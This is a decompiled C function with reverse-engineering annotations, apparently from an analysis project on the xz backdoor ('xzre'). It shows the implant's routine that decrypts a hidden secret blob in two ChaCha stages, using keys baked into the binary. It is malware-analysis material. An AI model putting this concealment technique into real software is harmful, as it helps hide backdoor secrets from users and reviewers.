// /home/kali/xzre-ghidra/xzregh/1081D0_secret_data_get_decrypted.c
// Function: secret_data_get_decrypted @ 0x1081D0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_get_decrypted(u8 * output, global_context_t * ctx)


/*
 * AutoDoc: Unwraps the 0x39-byte `ctx->secret_data` blob using two ChaCha passes routed through the resolver’s EVP imports. First it zeroes the
 * stack copies of the seed/IV buffers, patches the baked-in `key_buf` header, and decrypts a 0x30-byte seed chunk with the static
 * key/IV stored beside the function. That seed is treated as the runtime ChaCha key for a second decrypt that finally emits the
 * plaintext secret into the caller buffer, proving no portable crypto ships with the implant.
 */

#include "xzre_types.h"

BOOL secret_data_get_decrypted(u8 *output,global_context_t *ctx)

{
  imported_funcs_t *funcs;
  BOOL decrypt_ok;
  long wipe_rounds;
  u8 *wipe_cursor;
  key_buf payload_key_buf;
  key_buf seed_key_buf;
  u8 seed_iv[0x10];
  u8 seed_block[0x70];
  u8 payload_iv[0x10];
  
  if (output == (u8 *)0x0) {
    return FALSE;
  }
  if ((ctx != (global_context_t *)0x0) &&
     (funcs = ctx->imported_funcs, funcs != (imported_funcs_t *)0x0)) {
    // AutoDoc: Scrub the stack copy of the seed/IV trailer before reusing it as the ChaCha input/output buffer.
    wipe_cursor = seed_key_buf.encrypted_seed + 0x20;
    for (wipe_rounds = 0xc; wipe_rounds != 0; wipe_rounds = wipe_rounds + -1) {
      *(u32 *)wipe_cursor = 0;
      wipe_cursor = (u8 *)((long)wipe_cursor + 4);
    }
    wipe_cursor = seed_block;
    // AutoDoc: Zero the 0x70-byte seed_block staging buffer four bytes at a time before reusing it as ChaCha output.
    for (wipe_rounds = 0x1c; wipe_rounds != 0; wipe_rounds = wipe_rounds + -1) {
      wipe_cursor[0] = '\0';
      wipe_cursor[1] = '\0';
      wipe_cursor[2] = '\0';
      wipe_cursor[3] = '\0';
      wipe_cursor = wipe_cursor + 4;
    }
    seed_key_buf.encrypted_seed[0x18] = '3';
    seed_key_buf.encrypted_seed[0x19] = 0x82;
    seed_key_buf.encrypted_seed[0x1a] = '\x10';
    seed_key_buf.encrypted_seed[0x1b] = '\0';
    seed_key_buf.encrypted_seed[0x1c] = '\0';
    seed_key_buf.encrypted_seed[0x1d] = '\0';
    seed_key_buf.encrypted_seed[0x1e] = '\0';
    seed_key_buf.encrypted_seed[0x1f] = '\0';
    // AutoDoc: Stage one: decrypt the embedded 0x30-byte seed with the static key/IV constants baked into the binary.
    decrypt_ok = chacha_decrypt(seed_key_buf.encrypted_seed + 0x20,0x30,
                           seed_key_buf.encrypted_seed + 0x20,seed_iv,seed_block,funcs);
    if (decrypt_ok != FALSE) {
      seed_key_buf.encrypted_seed[0x18] = 'W';
      seed_key_buf.encrypted_seed[0x19] = 0x82;
      seed_key_buf.encrypted_seed[0x1a] = '\x10';
      seed_key_buf.encrypted_seed[0x1b] = '\0';
      seed_key_buf.encrypted_seed[0x1c] = '\0';
      seed_key_buf.encrypted_seed[0x1d] = '\0';
      seed_key_buf.encrypted_seed[0x1e] = '\0';
      seed_key_buf.encrypted_seed[0x1f] = '\0';
      // AutoDoc: Stage two: feed the freshly decrypted seed in as the ChaCha key to unwrap the live secret-data blob.
      decrypt_ok = chacha_decrypt(ctx->encrypted_secret_data,0x39,seed_block,payload_iv,output,
                             ctx->imported_funcs);
      return (uint)(decrypt_ok != FALSE);
    }
  }
  return FALSE;
}

